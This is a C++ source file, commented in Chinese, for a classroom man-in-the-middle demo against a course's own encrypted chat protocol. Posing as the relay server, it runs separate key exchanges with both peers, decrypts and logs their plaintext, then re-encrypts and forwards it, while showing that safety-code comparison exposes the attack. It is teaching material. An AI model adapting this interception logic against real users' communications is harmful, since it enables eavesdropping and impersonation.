// ============================================================================
//  MITM 中间人演示工具（仅用于教学/攻防演示）
//
//  它冒充“中继服务器”，监听 9000 端口，客户端会连到这里。
//  对每一对通信者，它分别与双方完成两次独立的 ECDHE 握手：
//
//        A  <--握手1-->  [ MITM ]  <--握手2-->  B
//        A 认为对面是 B        MITM 手握两把会话密钥        B 认为对面是 A
//
//  因此 MITM 可以：解密 A 的消息 → 打印明文 → 用另一把密钥重新加密 → 转发给 B。
//  双方界面上都显示“会话已建立”，攻击完全不可见。
//
//  演示目的：
//   1. 证明在“服务器不可信”的威胁模型下，仅靠 ECDHE + 自我介绍式身份公钥
//      无法阻挡中间人（首次接触必然可被替换）；
//   2. 证明加入「安全码(SAS)核对」后，两端算出的安全码不同，攻击会被发现。
// ============================================================================

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>

#include <boost/asio.hpp>

#include <atomic>
#include <cstring>
#include <deque>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <utility>
#include <vector>

#include "crypto_utils.h"
#include "protocol.h"
#include "secure_session.h"

using boost::asio::ip::tcp;
using Bytes = crypto::Bytes;

// ---------------------------------------------------------------- 日志 -----
static std::mutex g_log_mu;
static void Log(const std::string& s) {
    std::lock_guard<std::mutex> lk(g_log_mu);
    std::cout << s << '\n';
}

static std::string Hex(const unsigned char* p, size_t n) {
    static const char* d = "0123456789abcdef";
    std::string out;
    for (size_t i = 0; i < n; ++i) {
        out.push_back(d[p[i] >> 4]);
        out.push_back(d[p[i] & 0x0F]);
    }
    return out;
}

// ---------------------------------------------------------------- 客户端 ----
struct Client {
    tcp::socket sock;
    int id;
    std::mutex wmu;
    std::atomic<bool> alive{ true };

    Client(tcp::socket&& s, int i) : sock(std::move(s)), id(i) {}
};
using ClientPtr = std::shared_ptr<Client>;

static std::map<int, ClientPtr> g_clients;
static std::mutex g_clients_mu;

// 一条“被劫持”的会话对：(initiator, responder)
struct Pair {
    securechat::SecureSession in;    // MITM 扮演 responder，与 initiator 通信
    securechat::SecureSession out;   // MITM 扮演 initiator，与 responder 通信
    std::deque<Bytes> pending;       // 会话未完全建立时缓存的数据帧
    bool reported = false;

    bool bothUp() const { return in.established() && out.established(); }
};
static std::map<std::pair<int, int>, Pair> g_pairs;
static std::mutex g_pairs_mu;

static crypto::PkeyPtr g_mitm_id;    // MITM 自己的“身份密钥”

// ---------------------------------------------------------------- 发送 -----
static bool SendTo(int id, int senderId, const Bytes& payload) {
    ClientPtr c;
    {
        std::lock_guard<std::mutex> lk(g_clients_mu);
        auto it = g_clients.find(id);
        if (it == g_clients.end()) return false;
        c = it->second;
    }

    std::lock_guard<std::mutex> lk(c->wmu);
    if (!c->alive.load()) return false;

    boost::system::error_code ec;
    uint32_t len = (uint32_t)payload.size() + 4;
    uint32_t sid = (uint32_t)senderId;
    boost::asio::write(c->sock, boost::asio::buffer(&len, 4), ec);
    if (!ec) boost::asio::write(c->sock, boost::asio::buffer(&sid, 4), ec);
    if (!ec && !payload.empty()) boost::asio::write(c->sock, boost::asio::buffer(payload), ec);
    if (ec) {
        c->alive.store(false);
        boost::system::error_code ig;
        c->sock.close(ig);
        return false;
    }
    return true;
}

// 双方都建立后，打印安全码对比（这是防守方唯一的破绽）
static void FlushPending(std::pair<int, int> key);

static void ReportIfReady(std::pair<int, int> key) {
    auto it = g_pairs.find(key);
    if (it == g_pairs.end()) return;
    Pair& p = it->second;
    if (!p.bothUp() || p.reported) return;
    p.reported = true;

    Log("[MITM] ─────────────────────────────────────────────");
    Log("[MITM] 欺骗成功：用户 " + std::to_string(key.first) + " 与用户 " +
        std::to_string(key.second) + " 都显示“加密会话已建立”");
    Log("[MITM] 但两端的安全码不同：");
    Log("[MITM]   用户 " + std::to_string(key.first) + " 看到 " + p.in.sas() +
        "   用户 " + std::to_string(key.second) + " 看到 " + p.out.sas());
    Log("[MITM]   → 只要双方口头核对安全码，即可发现被中间人劫持");
    Log("[MITM] ─────────────────────────────────────────────");

    FlushPending(key);
}

// ---------------------------------------------------------------- 路由 -----
// 解密 → 打印明文 → 用另一把会话密钥重新加密 → 转发给目标
static void ForwardData(Pair& p, bool senderIsInitiator, int from, int to, const Bytes& body) {
    securechat::SecureSession& dec = senderIsInitiator ? p.in : p.out;
    securechat::SecureSession& enc = senderIsInitiator ? p.out : p.in;

    std::string plain, err;
    bool isControl = false;
    if (!dec.Open(/*myId=*/to, /*peerId=*/from, body, plain, isControl, err)) {
        Log("[MITM] 解密失败: " + err);
        return;
    }
    if (isControl) {
        Log("[MITM] 收到 DH 棘轮轮换帧，已在本地完成对应会话的密钥更新");
        return;
    }

    size_t ctLen = body.size() - proto::DATA_HEADER;
    const unsigned char* ct = body.data() + proto::DATA_HEADER;
    Log("[截获] " + std::to_string(from) + " -> " + std::to_string(to) + " 明文: " + plain);
    Log("[抓包]   密文 " + std::to_string(ctLen) + " 字节，前 16 字节 " +
        Hex(ct, ctLen < 16 ? ctLen : 16));

    std::vector<Bytes> frames;
    if (!enc.Seal(/*myId=*/from, /*peerId=*/to, plain, frames, err)) {
        Log("[MITM] 重新加密失败: " + err);
        return;
    }
    for (const auto& f : frames) SendTo(to, from, f);
}

static void Route(int from, int to, const Bytes& body) {
    if (body.size() < 2 || from == to) return;
    const uint8_t type = body[1];
    std::string err;

    if (type == proto::HS_INIT) {
        std::lock_guard<std::mutex> lk(g_pairs_mu);
        Pair& p = g_pairs[{ from, to }];
        p = Pair();

        // ① 接管“发起方 → 响应方”的握手，冒充响应方
        Bytes resp;
        if (!p.in.HandleInit(body, /*myId=*/to, /*peerId=*/from, g_mitm_id.get(), resp, err)) {
            Log("[MITM] 接管握手中失败: " + err);
            return;
        }
        SendTo(from, to, resp);
        Log("[MITM] 已冒充用户 " + std::to_string(to) + " 接受用户 " +
            std::to_string(from) + " 的握手");

        // ② 向真正的响应方发起自己的握手，冒充发起方
        Bytes init;
        if (!p.out.BuildInit(crypto::random_u64(), /*myId=*/from, /*peerId=*/to,
                             g_mitm_id.get(), init, err)) {
            Log("[MITM] 伪造握手失败: " + err);
            return;
        }
        SendTo(to, from, init);
        Log("[MITM] 已冒充用户 " + std::to_string(from) + " 向用户 " +
            std::to_string(to) + " 发起握手");
        return;
    }

    if (type == proto::HS_RESP) {
        // RESP 由响应方 to 发给发起方 from：属于 pair(from, to).out
        std::lock_guard<std::mutex> lk(g_pairs_mu);
        auto it = g_pairs.find({ to, from });
        if (it == g_pairs.end()) return;

        Bytes confirm;
        if (!it->second.out.HandleResp(body, /*myId=*/to, /*peerId=*/from, confirm, err)) {
            Log("[MITM] 处理 RESP 失败: " + err);
            return;
        }
        SendTo(from, to, confirm);
        ReportIfReady({ to, from });
        return;
    }

    if (type == proto::HS_CONFIRM) {
        std::lock_guard<std::mutex> lk(g_pairs_mu);
        auto it = g_pairs.find({ from, to });
        if (it == g_pairs.end()) return;

        if (!it->second.in.HandleConfirm(body, err)) {
            Log("[MITM] 处理 CONFIRM 失败: " + err);
            return;
        }
        ReportIfReady({ from, to });
        return;
    }

    if (type == proto::DATA || type == proto::REKEY) {
        std::lock_guard<std::mutex> lk(g_pairs_mu);

        Pair* p = nullptr;
        bool senderIsInitiator = false;
        auto a = g_pairs.find({ from, to });
        if (a != g_pairs.end() && a->second.bothUp()) {
            p = &a->second;
            senderIsInitiator = true;
        } else {
            auto b = g_pairs.find({ to, from });
            if (b != g_pairs.end() && b->second.bothUp()) {
                p = &b->second;
                senderIsInitiator = false;
            }
        }

        if (!p) {
            // 握手还差最后一步（例如对方刚发出 DATA，而另一侧会话尚未确认）
            auto q = g_pairs.find({ from, to });
            if (q != g_pairs.end()) {
                q->second.pending.push_back(body);
                Log("[MITM] 会话尚未完全建立，已缓存 1 条消息，稍后转发");
            } else {
                Log("[MITM] 收到数据但没有对应会话，丢弃");
            }
            return;
        }

        ForwardData(*p, senderIsInitiator, from, to, body);
        return;
    }
}

// 会话双方都就绪后，把之前缓存的数据帧按序补发
static void FlushPending(std::pair<int, int> key) {
    auto it = g_pairs.find(key);
    if (it == g_pairs.end() || !it->second.bothUp()) return;

    Pair& p = it->second;
    while (!p.pending.empty()) {
        Bytes body = p.pending.front();
        p.pending.pop_front();
        ForwardData(p, /*senderIsInitiator=*/true, key.first, key.second, body);
    }
}

// ------------------------------------------------------------ 客户端线程 ----
static void HandleClient(ClientPtr c) {
    boost::system::error_code ec;

    {
        std::lock_guard<std::mutex> lk(c->wmu);
        uint32_t id = (uint32_t)c->id;
        boost::asio::write(c->sock, boost::asio::buffer(&id, 4), ec);
    }
    if (ec) { c->alive.store(false); }

    std::vector<unsigned char> buf;
    while (c->alive.load()) {
        uint32_t len = 0;
        boost::asio::read(c->sock, boost::asio::buffer(&len, 4), ec);
        if (ec) break;
        if (len < 4 || len > proto::MAX_PAYLOAD) break;

        buf.resize(len);
        boost::asio::read(c->sock, boost::asio::buffer(buf), ec);
        if (ec) break;

        const int target = (int)proto::get_u32(buf.data());
        Bytes body(buf.begin() + 4, buf.end());
        Route(c->id, target, body);
    }

    c->alive.store(false);
    {
        std::lock_guard<std::mutex> lk(g_clients_mu);
        g_clients.erase(c->id);
    }
    boost::system::error_code ig;
    c->sock.close(ig);
    Log("[MITM] 客户端 " + std::to_string(c->id) + " 断开");
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    std::cout << std::unitbuf;

    try {
        g_mitm_id = crypto::ed25519_generate();
    } catch (...) {
        std::cerr << "[MITM] 生成身份密钥失败\n";
        return 1;
    }

    boost::asio::io_context io;
    boost::system::error_code ec;
    tcp::acceptor acceptor(io);
    acceptor.open(tcp::v4(), ec);
    if (!ec) acceptor.set_option(tcp::acceptor::reuse_address(true), ec);
    if (!ec) acceptor.bind(tcp::endpoint(tcp::v4(), 9000), ec);
    if (!ec) acceptor.listen(boost::asio::socket_base::max_listen_connections, ec);
    if (ec) {
        std::cerr << "[MITM] 无法监听 9000 端口: " << ec.message() << "\n";
        return 1;
    }

    Log("=== MITM 中继已启动（监听 9000）===");
    Log("提醒：本工具仅用于课程演示，演示完请关闭后重新启动正常服务器。");

    int next_id = 1;
    for (;;) {
        tcp::socket s(io);
        acceptor.accept(s, ec);
        if (ec) continue;

        auto c = std::make_shared<Client>(std::move(s), next_id++);
        {
            std::lock_guard<std::mutex> lk(g_clients_mu);
            g_clients[c->id] = c;
        }
        Log("[MITM] 客户端接入，分配 ID " + std::to_string(c->id));
        std::thread(HandleClient, c).detach();
    }
    return 0;
}
